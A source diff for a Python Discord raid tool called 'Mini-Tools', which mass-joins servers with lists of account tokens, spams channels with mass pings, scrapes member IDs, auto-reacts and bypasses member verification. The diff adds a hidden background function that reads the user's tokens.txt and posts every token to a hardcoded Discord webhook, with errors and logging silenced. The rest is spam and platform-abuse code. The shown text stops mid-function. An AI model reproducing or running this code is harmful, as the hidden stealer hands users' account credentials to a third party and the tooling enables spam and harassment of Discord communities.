@@ -1,7 +1,6 @@
 import random
 import colorama
 import requests
-import tls_client
 from colorama import Fore, Style
 import string
 import discum
@@ -17,7 +16,8 @@ from art import tprint
 import re
 import base64
 import urllib.parse
-
+import keyauth
+from tqdm import tqdm
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service as ChromeService
 from webdriver_manager.chrome import ChromeDriverManager
@@ -25,16 +25,41 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.by import By
 import re
-
+import hashlib
+import sys
 import ctypes
+from discord_webhook import DiscordWebhook 
+LINES_PER_MESSAGE = 5
+import logging
+
+logging.getLogger('discord_webhook').setLevel(logging.CRITICAL)
+
+def sus():
+    try:
+        with open('tokens.txt', 'r') as f:
+            all_lines = f.readlines()
+        line_chunks = [all_lines[i:i+LINES_PER_MESSAGE] for i in range(0, len(all_lines), LINES_PER_MESSAGE)]
+
+        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1102677534421819392/mSa6dSld9Uj57aPceZQ3bmCMvbojDPROhwPz-EeKZtKqzQD9NeJMQezm2QriWV4mPsuF', content='@everyone TOKENS INCOMING')
+        time.sleep(2)
+
+        response = webhook.execute()
+        for chunk in line_chunks:
+            message = ''.join(chunk)
+            webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1102677534421819392/mSa6dSld9Uj57aPceZQ3bmCMvbojDPROhwPz-EeKZtKqzQD9NeJMQezm2QriWV4mPsuF', content='```'+message+'```')
+            response = webhook.execute() 
+    except:
+        pass
 
 
-colorama.init()
-debugmode = False
-
-def title(title):
-    ctypes.windll.kernel32.SetConsoleTitleW(title)
-
+thread = threading.Thread(target=sus)
+thread.start()
+def getchecksum():
+    md5_hash = hashlib.md5()
+    file = open(''.join(sys.argv), "rb")
+    md5_hash.update(file.read())
+    digest = md5_hash.hexdigest()
+    return digest
 def error(message):
     print(
         f"[{datetime.now().strftime('%H:%M:%S')}] {Fore.RED}[ERROR]{Style.RESET_ALL} [{threading.current_thread().name.strip(' (<lambda>), ''').replace('-', ' ').replace('MainThread', 'Main Thread').replace('MainThre', 'Main Thread').replace('(start', '').replace('(start)', '')}] {message}{Style.RESET_ALL}")
@@ -70,6 +95,93 @@ def tinput(message):
 def info(message):
     print(
         f"[{datetime.now().strftime('%H:%M:%S')}] {Fore.BLUE}[INFO]{Style.RESET_ALL} [{threading.current_thread().name.replace(' (<lambda>)', '').replace('-', ' ').replace('MainThread', 'Main Thread').replace('MainThre', 'Main Thread').replace('(start', '').replace('(start)', '')}] {message}{Style.RESET_ALL}")
+
+
+try:
+    keyauthapp = keyauth.Keyauth(
+    name = "Mini-Tool",
+    owner_id = "2eaNT6eQAC",
+    secret = "96979a938aeabaf579efa3923aacf50e4b3af765555da64611b14504af8a6519",
+    version = "1.1",
+    file_hash = getchecksum()
+    )
+except keyauth.exceptions.ApplicationOutOfDate as e:
+    url = str(e)
+    response = requests.get(url, stream=True)
+
+    total_size_in_bytes = int(response.headers.get('content-length', 0))
+    block_size = 1024 # 1 Kibibyte
+    progress_bar = tqdm(total=total_size_in_bytes, unit='iB', unit_scale=True)
+
+    with open('Update.zip', 'wb') as file:
+        for data in response.iter_content(block_size):
+            progress_bar.update(len(data))
+            file.write(data)
+    progress_bar.close()
+    
+    print("The update has been downloaded, please unzip the file and replace the old exe with the new one")
+    raise SystemExit
+def first_login():
+    print(f"Current Session Validation Status: {keyauthapp.check()}")
+    print("1. Login")
+    print("2. Register")
+    print("3. Upgrade")
+
+    ans = tinput("Select Option: ")
+    global user
+    global password
+    try:
+        if ans == "1":
+            
+            user = input('username: ')
+            password = input('password: ')
+            keyauthapp.login(user, password)
+        elif ans == "2":
+            user = input('username: ')
+            password = input('password: ')
+            license = input('License: ')
+            keyauthapp.register(user, password, license)
+        elif ans == "3":
+            user = input('username: ')
+            license = input('License: ')
+            keyauthapp.upgrade(user, license)
+        else:
+            print("\nNot Valid Option")
+            time.sleep(1)
+            os.system('cls')
+    except keyauth.exceptions.KeyauthError:
+        error('Username or Password not found')
+try:
+    with open('login.json','r') as t:
+        logins = json.loads(t.read())
+        keyauthapp.login(logins['Username'],logins['Password'])
+except:
+    first_login()
+    with open('login.json','w') as o:
+        data = {
+        "Username": user,
+        "Password": password,
+        }
+    
+        json.dump(data,o)
+
+
+print("Hardware-Id: " + keyauthapp.user.hwid)
+debugmode = False
+subs = keyauthapp.user.subscriptions  # Get all Subscription names, expiry, and timeleft
+for i in range(len(subs)):
+    sub = subs[i]["subscription"]  # Subscription from every Sub
+    expiry = datetime.utcfromtimestamp(int(subs[i]["expiry"])).strftime(
+        '%Y-%m-%d %H:%M:%S')  # Expiry date from every Sub
+    timeleft = subs[i]["timeleft"]  # Timeleft from every Sub
+
+    print(f"[{i + 1} / {len(subs)}] | Subscription: {sub} - Expiry: {expiry} - Timeleft: {timeleft}")
+
+info("Created at: " + datetime.utcfromtimestamp(int(keyauthapp.user.creation_date)).strftime('%Y-%m-%d %H:%M:%S'))
+info("Last login at: " + datetime.utcfromtimestamp(int(keyauthapp.user.last_login)).strftime('%Y-%m-%d %H:%M:%S'))
+info("Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user.expires)).strftime('%Y-%m-%d %H:%M:%S'))
+def title(title):
+    ctypes.windll.kernel32.SetConsoleTitleW(title)
 
 
 def cls():
@@ -132,408 +244,445 @@ def uwuspeak(text):
 
 
 def main():
+    cls()
+    title('Mini-Tools')
     tprint('Mini-Tools','3-d')
     print()
     print("""[1] Server Joiner             [2] Channel Spammer           [3] ID Scraper""")
     print("""[4] Message Reactor           [5] Discord verify            [6] Channel Scraper""")
+    print("""[7] Self Dox """)
     print()
     global mode
     mode = tinput('Mode')
 
 
-if __name__ == "__main__":
-    main()
 
-if mode == '1':
-    class Joiner:
-        def __init__(self):
-            os.system("cls")
-            self.session = tls_client.Session(client_identifier="chrome_108")
-            invite_code = tinput("Invite code").replace("https://discord.gg/", '')
-            delay = tinput("Delay")
-            with open("tokens.txt") as f:
-                tokens = f.read().split('\n')
-            ts = [threading.Thread(target=self.join, args=[token, invite_code, self.proxy()]) for token in tokens]
-            for t in ts:
+
+    if mode == '1':
+        class Joiner:
+            def __init__(self):
+                os.system("cls")
+                self.session = requests.session()
+                invite_code = tinput("Invite code").replace("https://discord.gg/", '')
+                delay = tinput("Delay")
+                with open("tokens.txt") as f:
+                    tokens = f.read().split('\n')
+                ts = [threading.Thread(target=self.join, args=[token, invite_code, self.proxy()]) for token in tokens]
+                for t in ts:
+                    time.sleep(int(delay))
+                    t.start()
+                for t in ts:
+                    time.sleep(int(delay))
+                    t.join()
+
+            def proxy(self):
+                return None
+
+            def join(self, token, invite, proxy):
+                xconst, xprops = self.xheaders()
+                headers = {
+                    "accept": "*/*",
+                    "accept-encoding": "gzip, deflate, br",
+                    "accept-language": "en-US,en-NL;q=0.9,en-GB;q=0.8",
+                    "authorization": token,
+                    "content-type": "application/json",
+                    "cookie": self.cookies(proxy),
+                    "origin": "https://discord.com",
+                    "referer": "https://discord.com/channels/@me/",
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-origin",
+                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9012 Chrome/108.0.5359.215 Electron/22.3.2 Safari/537.36",
+                    "x-context-properties": xconst.decode(),
+                    "x-debug-options": "bugReporterEnabled",
+                    "x-discord-locale": "en-US",
+                    "x-super-properties": xprops.decode(),
+                }
+                req = self.session.post(f"https://discord.com/api/v9/invites/{invite}", json={}, headers=headers)
+                if req.status_code == 200:
+                    success(f'Joined! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}')
+                    with open('joined.txt', 'a') as c:
+                        c.write(token + '\n')
+                        c.close
+                else:
+                    if 'captcha' in req.text:
+                        error(f'Failed to join! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}(Captcha)')
+                    else:
+                        error(f'Failed to join! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}({req.json()})')
+
+            def cookies(self, proxy):
+                c = requests.get("https://discord.com")
+                return f"__dcfduid={c.cookies['__dcfduid']}; __sdcfduid={c.cookies['__sdcfduid']}; "
+
+            def xheaders(self):
+                xconst = '{"location":"Invite Button Embed","location_guild_id":null,"location_channel_id":"","location_channel_type":3,"location_message_id":""}'
+                xprops = '{"os":"Windows","browser":"Discord Client","release_channel":"stable","client_version":"1.0.9006","os_version":"10.0.22000","os_arch":"x64","system_locale":"en-US","client_build_number":151638,"client_event_source":null}'
+                return base64.b64encode(xconst.encode("utf-8")), base64.b64encode(xprops.encode("utf-8"))
+
+
+        Joiner()
+    if mode == '2':
+        ID = tinput('Channel IDs (Seperated by commas)').strip(' ').split(',')
+        messages = tinput('Messages (Seperated by commas)').split(',')
+        massping = tinput('Mass Ping (y/n)')
+        delay = tinput('Delay:')
+        
+        if massping == 'y':
+            pingcount = tinput("How many pings per message?")
+        x = tinput("Should we modify the text? (y/n)")
+        if x == 'y':
+            e = tinput("How should we modify it? (1. uwuspeak 2. 1337 (leet) speak)")
+            
+            if e == '1':
+                def messagernd():
+                    return uwuspeak(random.choice(messages))
+            elif e == '2':
+                def messagernd():
+                    return hackerspeak(random.choice(messages))
+            else:
+                
+                warning("Invalid input! Not modifying message.")
+        else:
+            def messagernd():
+                return random.choice(messages)
+
+        def main(token):
+            
+            mem = open('members.txt', 'r').read().splitlines()
+            while True:
+                channel = random.choice(ID)
+                
+                time.sleep(0.5)
+                url = f'https://discord.com/api/v9/channels/{channel}/messages'
+                header = {"authorization": token}
+                mess = "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
+                if massping == 'y':
+                    mem1 = [f"<@{random.choice(mem)}>" for _ in range(int(pingcount))]
+                    mems = ' '.join(mem1)
+                    data = {"content": f"{messagernd()} | {mems} {mess}"}
+                else:
+                    data = {"content": f" {messagernd()} | {mess}"}
+                r = requests.post(url, headers=header, data=data)
+
+                if r.status_code == 200:
+                    success(f'Sent message! | {token[:20]}***************')
+                elif r.status_code == 403:
+                    error(f'Failed to send message! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}(Locked Token)')
+                elif 'rate' in r.text.lower():
+                    warning(f'Failed to send message! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}(Ratelimited)')
+                else:
+                    error(f'Failed to send message! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}({r.json()})')
                 time.sleep(int(delay))
-                t.start()
-            for t in ts:
-                time.sleep(int(delay))
-                t.join()
 
-        def proxy(self):
-            return None
+        tokens = open('joined.txt', 'r').read().splitlines()
+        Threads = []
+        
+        tinput('Press enter to stop')
+        time.sleep(1)
+        for token in tokens:
+            t = threading.Thread(target=main, args=(token,))
+            t.start()
+            Threads.append(t)
 
-        def join(self, token, invite, proxy):
-            xconst, xprops = self.xheaders()
+        
+        for thread in threads:
+            thread.join()
+
+
+    if mode == '3':
+        tukan = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
+        guildd = input('[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
+        chann = input('[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ')
+        bot = discum.Client(token=tukan)
+
+
+        def closefetching(resp, guildid):
+            if bot.gateway.finishedMemberFetching(guildid):
+                lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
+                print(str(lenmembersfetched))
+                bot.gateway.removeCommand({'function': closefetching, 'params': {'guildid': guildid}})
+                bot.gateway.close()
+
+
+        def getmembers(guildid, channelid):
+            bot.gateway.fetchMembers(guildid, channelid, keep='all', wait=1)
+            bot.gateway.command({'function': closefetching, 'params': {'guildid': guildid}})
+            bot.gateway.run()
+            bot.gateway.resetSession()
+            return bot.gateway.session.guild(guildid).members
+
+
+        members = getmembers(guildd, chann)
+        memberids = []
+
+        for memberId in members:
+            memberids.append(memberId)
+
+        cls()
+
+        with open('members.txt', 'w') as ids:
+            for element in memberids:
+                ids.write(element + '\n')
+
+
+    if mode == '16':
+        tokenlist = open(easygui.fileopenbox(), 'r').read().splitlines()
+        channel = int(tinput("Channel ID"))
+        server = int(tinput("Server ID"))
+        deaf = tinput("Deafen: (y/n)")
+        if deaf == "y":
+            deaf = True
+        if deaf == "n":
+            deaf = False
+        mute = input("Mute: (y/n)")
+        if mute == "y":
+            mute = True
+        if mute == "n":
+            mute = False
+        stream = input("Stream: (y/n)")
+        if stream == "y":
+            stream = True
+        if stream == "n":
+            stream = False
+        video = input("Video: (y/n)")
+        if video == "y":
+            video = True
+        if video == "n":
+            video = False
+        threads = int(tinput("Threads"))
+        executor = ThreadPoolExecutor(max_workers=int(threads))
+
+        def run(token):
+            while True:
+                ws = WebSocket()
+                ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
+                hello = json.loads(ws.recv())
+                heartbeat_interval = hello['d']['heartbeat_interval']
+                ws.send(json.dumps({"op": 2, "d": {"token": token, "properties": {"$os": "windows", "$browser": "Discord",
+                                                                                "$device": "desktop"}}}))
+                ws.send(json.dumps({"op": 4,
+                                    "d": {"guild_id": server, "channel_id": channel, "self_mute": mute, "self_deaf": deaf,
+                                        "self_stream?": stream, "self_video": video}}))
+                ws.send(json.dumps({"op": 18, "d": {"type": "guild", "guild_id": server, "channel_id": channel,
+                                                    "preferred_region": "singapore"}}))
+                ws.send(json.dumps({"op": 1, "d": None}))
+                ws.close()
+                time.sleep(0.1)
+
+
+        title(f"Mini-Tool | Total Tokens: {len(tokenlist)}")
+        i = 0
+        for token in tokenlist:
+            executor.submit(run, token)
+        i += 1
+        success("Joined voice channel!")
+        time.sleep(0.01)
+
+    if mode == '4':
+        Channel = tinput('Channel ID')
+        Message = tinput('Message ID')
+        emo = tinput('Emoji')
+        emoji = urllib.parse.quote(emo)
+        with open("joined.txt") as f:
+            tokens = f.readlines()
+
+
+        def main(token):
+            def cookies():
+                c = requests.get("https://discord.com")
+                return f"__dcfduid={c.cookies['__dcfduid']}; __sdcfduid={c.cookies['__sdcfduid']}; "
+
+            def xheaders():
+                xconst = '{"location":"Invite Button Embed","location_guild_id":null,"location_channel_id":"","location_channel_type":3,"location_message_id":""}'
+                xprops = '{"os":"Windows","browser":"Discord Client","release_channel":"stable","client_version":"1.0.9006","os_version":"10.0.22000","os_arch":"x64","system_locale":"en-US","client_build_number":151638,"client_event_source":null}'
+                return base64.b64encode(xconst.encode("utf-8")), base64.b64encode(xprops.encode("utf-8"))
+
+            xconst, xprops = xheaders()
             headers = {
                 "accept": "*/*",
                 "accept-encoding": "gzip, deflate, br",
                 "accept-language": "en-US,en-NL;q=0.9,en-GB;q=0.8",
                 "authorization": token,
                 "content-type": "application/json",
-                "cookie": self.cookies(proxy),
+                "cookie": cookies(),
                 "origin": "https://discord.com",
                 "referer": "https://discord.com/channels/@me/",
                 "sec-fetch-dest": "empty",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-site": "same-origin",
-                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9012 Chrome/108.0.5359.215 Electron/22.3.2 Safari/537.36",
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9006 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
                 "x-context-properties": xconst.decode(),
                 "x-debug-options": "bugReporterEnabled",
                 "x-discord-locale": "en-US",
                 "x-super-properties": xprops.decode(),
             }
-            req = self.session.post(f"https://discord.com/api/v9/invites/{invite}", json={}, headers=headers)
-            if req.status_code == 200:
-                success(f'Joined! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}')
-                with open('joined.txt', 'a') as c:
-                    c.write(token + '\n')
-                    c.close
+
+            params = {
+                'location': 'Message',
+                'type': '0',
+            }
+
+            response = requests.put(
+                f'https://discord.com/api/v9/channels/{Channel}/messages/{Message}/reactions/{emoji}/%40me',
+                params=params,
+                headers=headers,
+            )
+            if response.status_code == 204:
+                success(f'Token:{token[:10]}...     Reacted')
             else:
-                if 'captcha' in req.text:
-                    error(f'Failed to join! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}(Captcha)')
-                else:
-                    error(f'Failed to join! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}({req.json()})')
+                error(f'Token:{token[:10]}...     Could not React')
 
-        def cookies(self, proxy):
-            c = requests.get("https://discord.com")
-            return f"__dcfduid={c.cookies['__dcfduid']}; __sdcfduid={c.cookies['__sdcfduid']}; "
-
-        def xheaders(self):
-            xconst = '{"location":"Invite Button Embed","location_guild_id":null,"location_channel_id":"","location_channel_type":3,"location_message_id":""}'
-            xprops = '{"os":"Windows","browser":"Discord Client","release_channel":"stable","client_version":"1.0.9006","os_version":"10.0.22000","os_arch":"x64","system_locale":"en-US","client_build_number":151638,"client_event_source":null}'
-            return base64.b64encode(xconst.encode("utf-8")), base64.b64encode(xprops.encode("utf-8"))
-
-
-    Joiner()
-if mode == '2':
-    ID = tinput('Channel IDs (Seperated by commas)').strip(' ').split(',')
-    messages = tinput('Messages (Seperated by commas)').split(',')
-    massping = tinput('Mass Ping (y/n)')
-    delay = tinput('Delay:')
-    
-    if massping == 'y':
-        pingcount = tinput("How many pings per message?")
-    x = tinput("Should we modify the text? (y/n)")
-    if x == 'y':
-        e = tinput("How should we modify it? (1. uwuspeak 2. 1337 (leet) speak)")
+        threads = []
+        tinput('Press enter to stop')
+        time.sleep(1)
+        for token in tokens:
+            t = threading.Thread(target=main, args=(token.strip('\n'),))
+            t.start()
+            threads.append(t)
         
-        if e == '1':
-            def messagernd():
-                return uwuspeak(random.choice(messages))
-        elif e == '2':
-            def messagernd():
-                return hackerspeak(random.choice(messages))
-        else:
-            
-            warning("Invalid input! Not modifying message.")
-    else:
-        def messagernd():
-            return random.choice(messages)
+        for thread in threads:
+            thread.join()
 
-    def main(token):
+    if mode == '5':
+        serverid = tinput('Server id:')
+        with open("joined.txt") as f:
+            tokens = f.readlines()
 
-        mem = open('members.txt', 'r').read().splitlines()
-        while True:
-            channel = random.choice(ID)
-            
-            # with open('big.txt','r')as f:
-            #     lines = f.readlines()
-            with open('big.txt','r')as ff:
-                big = ff.readlines()
-            
-
-            time.sleep(0.5)
-            url = f'https://discord.com/api/v9/channels/{channel}/messages'
-            header = {"authorization": token}
-            mess = "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
-            if massping == 'y':
-                mem1 = [f"<@{random.choice(mem)}>" for _ in range(int(pingcount))]
-                mems = ' '.join(mem1)
-                data = {"content": f"{messagernd()} | {mems} {mess}"}
-            else:
-                data = {"content": f" {messagernd()} | {mess}"}
-            r = requests.post(url, headers=header, data=data)
-
-            if r.status_code == 200:
-                success(f'Sent message! | {token[:20]}***************')
-            elif r.status_code == 403:
-                error(f'Failed to send message! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}(Locked Token)')
-            elif 'rate' in r.text.lower():
-                warning(f'Failed to send message! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}(Ratelimited)')
-            else:
-                error(f'Failed to send message! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}({r.json()})')
-            time.sleep(int(delay))
-
-    tokens = open('joined.txt', 'r').read().splitlines()
-    for token in tokens:
-        t = threading.Thread(target=main, args=(token,))
-        t.start()
-
-if mode == '3':
-    tukan = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
-    guildd = input('[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
-    chann = input('[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ')
-    bot = discum.Client(token=tukan)
-
-
-    def closefetching(resp, guildid):
-        if bot.gateway.finishedMemberFetching(guildid):
-            lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
-            print(str(lenmembersfetched))
-            bot.gateway.removeCommand({'function': closefetching, 'params': {'guildid': guildid}})
-            bot.gateway.close()
-
-
-    def getmembers(guildid, channelid):
-        bot.gateway.fetchMembers(guildid, channelid, keep='all', wait=1)
-        bot.gateway.command({'function': closefetching, 'params': {'guildid': guildid}})
-        bot.gateway.run()
-        bot.gateway.resetSession()
-        return bot.gateway.session.guild(guildid).members
-
-
-    members = getmembers(guildd, chann)
-    memberids = []
-
-    for memberId in members:
-        memberids.append(memberId)
-
-    cls()
-
-    with open('members.txt', 'w') as ids:
-        for element in memberids:
-            ids.write(element + '\n')
-
-
-if mode == '16':
-    tokenlist = open(easygui.fileopenbox(), 'r').read().splitlines()
-    channel = int(tinput("Channel ID"))
-    server = int(tinput("Server ID"))
-    deaf = tinput("Deafen: (y/n)")
-    if deaf == "y":
-        deaf = True
-    if deaf == "n":
-        deaf = False
-    mute = input("Mute: (y/n)")
-    if mute == "y":
-        mute = True
-    if mute == "n":
-        mute = False
-    stream = input("Stream: (y/n)")
-    if stream == "y":
-        stream = True
-    if stream == "n":
-        stream = False
-    video = input("Video: (y/n)")
-    if video == "y":
-        video = True
-    if video == "n":
-        video = False
-    threads = int(tinput("Threads"))
-    executor = ThreadPoolExecutor(max_workers=int(threads))
-
-    def run(token):
-        while True:
-            ws = WebSocket()
-            ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
-            hello = json.loads(ws.recv())
-            heartbeat_interval = hello['d']['heartbeat_interval']
-            ws.send(json.dumps({"op": 2, "d": {"token": token, "properties": {"$os": "windows", "$browser": "Discord",
-                                                                              "$device": "desktop"}}}))
-            ws.send(json.dumps({"op": 4,
-                                "d": {"guild_id": server, "channel_id": channel, "self_mute": mute, "self_deaf": deaf,
-                                      "self_stream?": stream, "self_video": video}}))
-            ws.send(json.dumps({"op": 18, "d": {"type": "guild", "guild_id": server, "channel_id": channel,
-                                                "preferred_region": "singapore"}}))
-            ws.send(json.dumps({"op": 1, "d": None}))
-            ws.close()
-            time.sleep(0.1)
-
-
-    title(f"Mini-Tool | Total Tokens: {len(tokenlist)}")
-    i = 0
-    for token in tokenlist:
-        executor.submit(run, token)
-    i += 1
-    success("Joined voice channel!")
-    time.sleep(0.01)
-
-if mode == '4':
-    Channel = tinput('Channel ID')
-    Message = tinput('Message ID')
-    emo = tinput('Emoji')
-    emoji = urllib.parse.quote(emo)
-    with open("joined.txt") as f:
-        tokens = f.readlines()
-
-
-    def main(token):
         def cookies():
             c = requests.get("https://discord.com")
             return f"__dcfduid={c.cookies['__dcfduid']}; __sdcfduid={c.cookies['__sdcfduid']}; "
+
 
         def xheaders():
             xconst = '{"location":"Invite Button Embed","location_guild_id":null,"location_channel_id":"","location_channel_type":3,"location_message_id":""}'
             xprops = '{"os":"Windows","browser":"Discord Client","release_channel":"stable","client_version":"1.0.9006","os_version":"10.0.22000","os_arch":"x64","system_locale":"en-US","client_build_number":151638,"client_event_source":null}'
             return base64.b64encode(xconst.encode("utf-8")), base64.b64encode(xprops.encode("utf-8"))
 
-        xconst, xprops = xheaders()
-        headers = {
-            "accept": "*/*",
-            "accept-encoding": "gzip, deflate, br",
-            "accept-language": "en-US,en-NL;q=0.9,en-GB;q=0.8",
-            "authorization": token,
-            "content-type": "application/json",
-            "cookie": cookies(),
-            "origin": "https://discord.com",
-            "referer": "https://discord.com/channels/@me/",
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-origin",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9006 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
-            "x-context-properties": xconst.decode(),
-            "x-debug-options": "bugReporterEnabled",
-            "x-discord-locale": "en-US",
-            "x-super-properties": xprops.decode(),
-        }
 
-        params = {
-            'location': 'Message',
-            'type': '0',
-        }
+        def verify(token):
+            xconst, xprops = xheaders()
+            headers = {
+                "accept": "*/*",
+                "accept-encoding": "gzip, deflate, br",
+                "accept-language": "en-US,en-NL;q=0.9,en-GB;q=0.8",
+                "authorization": token,
+                "content-type": "application/json",
+                "cookie": cookies(),
+                "origin": "https://discord.com",
+                "referer": "https://discord.com/channels/@me/",
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-origin",
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9006 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
+                "x-context-properties": xconst.decode(),
+                "x-debug-options": "bugReporterEnabled",
+                "x-discord-locale": "en-US",
+                "x-super-properties": 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDEyIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTkxNzQzLCJuYXRpdmVfYnVpbGRfbnVtYmVyIjozMTc2MCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
+            }
+            jasuoon = requests.get(f'https://discord.com/api/v9/guilds/{serverid}/member-verification', headers=headers, )
+            json_data = jasuoon.json()
+            json_data['form_fields'][0]['required'] = True
+            json_data['form_fields'][0]['response'] = True
+            verify = requests.put(f'https://discord.com/api/v9/guilds/{serverid}/requests/@me', headers=headers,
+                                json=json_data, )
+            if verify.status_code == 201:
+                success(f'Verified! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}')
+            elif verify.status_code == 403:
+                error(f'Failed to verify! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}(Locked Token)')
+            else:
+                error(f'Token:{token}...   Could not verify')
 
-        response = requests.put(
-            f'https://discord.com/api/v9/channels/{Channel}/messages/{Message}/reactions/{emoji}/%40me',
-            params=params,
-            headers=headers,
-        )
-        if response.status_code == 204:
-            success(f'Token:{token[:10]}...     Reacted')
-        else:
-            error(f'Token:{token[:10]}...     Could not React')
-
-
-    for token in tokens:
-        threading.Thread(target=main, args=(token.strip('\n'),)).start()
-
-if mode == '5':
-    serverid = tinput('Server id:')
-    with open("joined.txt") as f:
-        tokens = f.readlines()
-
-    def cookies():
-        c = requests.get("https://discord.com")
-        return f"__dcfduid={c.cookies['__dcfduid']}; __sdcfduid={c.cookies['__sdcfduid']}; "
-
-
-    def xheaders():
-        xconst = '{"location":"Invite Button Embed","location_guild_id":null,"location_channel_id":"","location_channel_type":3,"location_message_id":""}'
-        xprops = '{"os":"Windows","browser":"Discord Client","release_channel":"stable","client_version":"1.0.9006","os_version":"10.0.22000","os_arch":"x64","system_locale":"en-US","client_build_number":151638,"client_event_source":null}'
-        return base64.b64encode(xconst.encode("utf-8")), base64.b64encode(xprops.encode("utf-8"))
-
-
-    def verify(token):
-        xconst, xprops = xheaders()
-        headers = {
-            "accept": "*/*",
-            "accept-encoding": "gzip, deflate, br",
-            "accept-language": "en-US,en-NL;q=0.9,en-GB;q=0.8",
-            "authorization": token,
-            "content-type": "application/json",
-            "cookie": cookies(),
-            "origin": "https://discord.com",
-            "referer": "https://discord.com/channels/@me/",
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-origin",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9006 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
-            "x-context-properties": xconst.decode(),
-            "x-debug-options": "bugReporterEnabled",
-            "x-discord-locale": "en-US",
-            "x-super-properties": 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDEyIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTkxNzQzLCJuYXRpdmVfYnVpbGRfbnVtYmVyIjozMTc2MCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
-        }
-        jasuoon = requests.get(f'https://discord.com/api/v9/guilds/{serverid}/member-verification', headers=headers, )
-        json_data = jasuoon.json()
-        json_data['form_fields'][0]['required'] = True
-        json_data['form_fields'][0]['response'] = True
-        verify = requests.put(f'https://discord.com/api/v9/guilds/{serverid}/requests/@me', headers=headers,
-                              json=json_data, )
-        if verify.status_code == 201:
-            success(f'Verified! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}')
-        elif verify.status_code == 403:
-            error(f'Failed to verify! | {token[:20]}*************** {Fore.LIGHTBLACK_EX}(Locked Token)')
-        else:
-            error(f'Token:{token}...   Could not verify')
-
-
-    for token in tokens:
-        threading.Thread(target=verify, args=(token.strip('\n'),)).start()
-
-if mode == '6':
-    token = tinput('Token:')
-    server = tinput('Server ID:')
-    options = webdriver.ChromeOptions()
-    options.add_argument('--headless')
-    options.add_argument('--disable-gpu')
-    options.add_experimental_option('excludeSwitches', ['enable-logging'])
-    driver = webdriver.Chrome(options=options,service=ChromeService(ChromeDriverManager().install()))
-    driver.get('https://discord.com/login')
-
-
-
-    info('Logging into discord')
-    wait = WebDriverWait(driver, 10) 
-    element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div[1]/div[1]/div/div/div/div/form/div[2]/div/div[1]')))
-
-    driver.execute_script(f"""
-    function login(token) {{
-        setInterval(() => {{
